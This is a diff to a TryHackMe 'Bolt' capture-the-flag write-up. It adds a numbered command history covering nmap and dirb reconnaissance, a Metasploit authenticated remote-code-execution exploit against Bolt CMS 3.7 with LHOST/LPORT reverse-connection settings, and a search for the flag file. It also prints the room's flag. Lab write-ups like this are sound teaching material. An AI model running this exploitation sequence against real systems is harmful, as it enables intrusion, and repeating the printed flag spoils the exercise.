@@ -225,24 +225,8 @@ DOWNLOADED: 4612 - FOUND: 5
 # Vulnerability Identification
 > Vulnerability Identification Using Metasploit
 14. `msfconsole`
-```bash
-msf6 > searchsploit Bolt 3.7
-[*] exec: searchsploit Bolt 3.7
-
-[i] Found (#2): /opt/searchsploit/files_exploits.csv
-[i] To remove this message, please edit "/opt/searchsploit/.searchsploit_rc" for "files_exploits.csv" (package_array: exploitdb)
-
-[i] Found (#2): /opt/searchsploit/files_shellcodes.csv
-[i] To remove this message, please edit "/opt/searchsploit/.searchsploit_rc" for "files_shellcodes.csv" (package_array: exploitdb)
-
----------------------------------------------- ---------------------------------
- Exploit Title                                |  Path
----------------------------------------------- ---------------------------------
-Bolt CMS 3.7.0 - Authenticated Remote Code Ex | php/webapps/48296.py
----------------------------------------------- ---------------------------------
-Shellcodes: No Results
-```
 15. `search Bolt 3.7`
+16. `info {EXPLOIT PATH}`
 ```bash
 ┌──(kali㉿kali)-[~]
 └─$ msfconsole 
@@ -294,7 +278,6 @@ Interact with a module by name or index. For example info 0, use 0 or use exploi
 
 msf6 >
 ```
-16. `info {EXPLOIT PATH}`
 ```bash
 msf6 > search Bolt 3.7
 
@@ -587,6 +570,41 @@ THM{wh0_d035nt_l0ve5_b0l7_r1gh7?}
 ![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/TryHackMe%20-%20Bolt.png)
 
 # Command History
+1. `nmap -sC -sV {TARGET-IP} > {FILENAME1}.txt`
+2. `cat {FILENAME1}.txt`
+3. `dirb http://{TARGET IP}:8000 > {FILENAME2}.txt`
+4. `cat {FILENAME2}.txt`
+5. `firefox "http://10.10.195.64:8000"`
+6. `firefox "http://10.10.195.64:8000/entries"`
+7. `firefox "http://10.10.195.64:8000/login.php"`
+8. `firefox "http://10.10.195.64:8000/pages"`
+9. `firefox "http://10.10.195.64:8000/search"`
+10. `firefox "https://www.google.com/search?client=firefox-b-d&q=boltcms"`
+11. `https://docs.boltcms.io/5.0/manual/login`
+12. `firefox "http://10.10.195.64:8000/bolt"`
+13. `msfconsole`
+14. `search Bolt 3.7`
+15. `info {EXPLOIT PATH}`
+16. `use {EXPLOIT PATH}`
+17. `show options`
+18. `set PASSWORD {JAKE'S PASSWORD}`
+19. `set RHOSTS {TARGET IP}`
+20. `set USERNAME {JAKE'S USERNAME}`
+21. `set LHOST {MACHINE IP}`
+22. `set LPORT {PORT NUMBER}`
+23. `show options`
+24. `exploit`
+25. `whoami`
+26. `find / -type f -name flag.txt 2>/dev/null`
+27. `cat {FLAG TEXT PATH}`
+
+# Dissecting Some Commands
+`nmap -sC -sV {TARGET-IP} > {FILENAME1}.txt`
++ 
+
+
+`find / -type f -name flag.txt 2>/dev/null`
++
 
 # Contributions
 This writeup was made by Jonmar Corpuz, founder of **KnowCybersecurity** (www.knowwwcybersecurity.com)
